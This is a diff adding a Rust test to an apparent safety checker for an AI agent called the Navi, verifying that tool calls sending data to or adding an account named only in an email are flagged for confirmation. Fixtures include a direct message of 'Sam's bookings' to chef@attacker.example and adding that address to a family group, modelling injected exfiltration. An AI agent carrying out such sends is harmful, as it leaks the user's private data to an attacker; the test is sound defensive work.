@@ -1080,3 +1080,54 @@ fn a_read_with_a_link_reaches_the_checker_as_a_read() {
         "read"
     );
 }
+
+/// `account` and `user_id` pick the person's own account only on a write in an account the Navi already read their
+/// data as. On a send, or holding an address only the email named, they may be whom it reaches: the code rule asks.
+#[test]
+fn an_account_field_is_a_recipient_unless_it_is_the_one_the_navi_read_as() {
+    // The account only in the calls the Navi read as, not in any mail's headers.
+    let mut context = gateway_context();
+    for r in &mut context.reads {
+        r.text = r.text.replace("To: sam@example.org\n", "");
+    }
+    let note = gateway(
+        "create_note",
+        json!({ "account": "sam@example.org", "text": "Dinner on Sunday" }),
+        ToolAction::Write,
+    );
+    assert!(
+        sources(&checker::review(&note, &context), "account")
+            .contains(&"an account the Navi read the person's data as")
+    );
+    let review = |tool: &str, input: Value, action: ToolAction| {
+        let review = checker::review(&gateway(tool, input, action), &context);
+        super::review::rules(&review).map(|n| n.verdict)
+    };
+    // A write in the account the Navi read the calendars as: no one it reaches.
+    assert_eq!(
+        review(
+            "create_note",
+            json!({ "account": "sam@example.org", "text": "Dinner on Sunday" }),
+            ToolAction::Write
+        ),
+        None
+    );
+    // A direct message to an address only the email named.
+    assert_eq!(
+        review(
+            "send_dm",
+            json!({ "user_id": "chef@attacker.example", "text": "Here are Sam's bookings" }),
+            ToolAction::Send
+        ),
+        Some(CheckerVerdict::Ask)
+    );
+    // Adding a member is a write, but the account it adds is no account the Navi read as.
+    assert_eq!(
+        review(
+            "add_member",
+            json!({ "account": "chef@attacker.example", "group": "family" }),
+            ToolAction::Write
+        ),
+        Some(CheckerVerdict::Ask)
+    );
+}
